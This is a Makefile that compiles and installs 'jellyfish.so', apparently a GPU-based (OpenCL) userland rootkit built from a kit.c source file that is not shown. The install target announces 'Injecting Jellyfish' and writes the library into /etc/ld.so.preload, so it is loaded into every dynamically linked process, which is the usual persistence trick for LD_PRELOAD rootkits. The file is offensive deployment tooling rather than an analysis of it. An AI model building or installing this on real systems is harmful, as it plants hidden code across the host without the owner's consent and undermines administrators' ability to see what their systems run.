INSTALL=/lib

LIBS= -lc -ldl -lOpenCL

# check for 32 or 64 bit
PROC_TYPE = $(strip $(shell uname -m | grep 64))

ifeq ($(PROC_TYPE),)
	CFlAGS += -m32
else
	CFLAGS += -m64
endif

# check for AMD
ifdef AMDAPPSDKROOT
   INC_DIRS = . $(AMDAPPSDKROOT)/include
	ifeq ($(PROC_TYPE),)
		LIB_DIRS=$(AMDAPPSDKROOT)/lib/x86
	else
		LIB_DIRS=$(AMDAPPSDKROOT)/lib/x86_64
	endif
else

# check for Nvidia
ifdef CUDA
   INC_DIRS = . $(CUDA)/OpenCL/common/inc
endif

endif

all: jellyfish.so

jellyfish.so: kit.c
	$(CC) $(CFLAGS) -I $(INC_DIRS) -L $(LIB_DIRS) $(LIBS) -fPIC -g -c kit.c
	$(CC) -fPIC -shared -Wl, -soname,jellyfish.so kit.o -I $(INC_DIRS) -L $(LIB_DIRS) $(LIBS) -o jellyfish.so
	strip jellyfish.so

install: all
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@install -m 0755 jellyfish.so $(INSTALL)/
	@echo [-] Injecting Jellyfish
	@echo $(INSTALL)/jellyfish.so > /etc/ld.so.preload

clean:
	rm jellyfish.so *.o
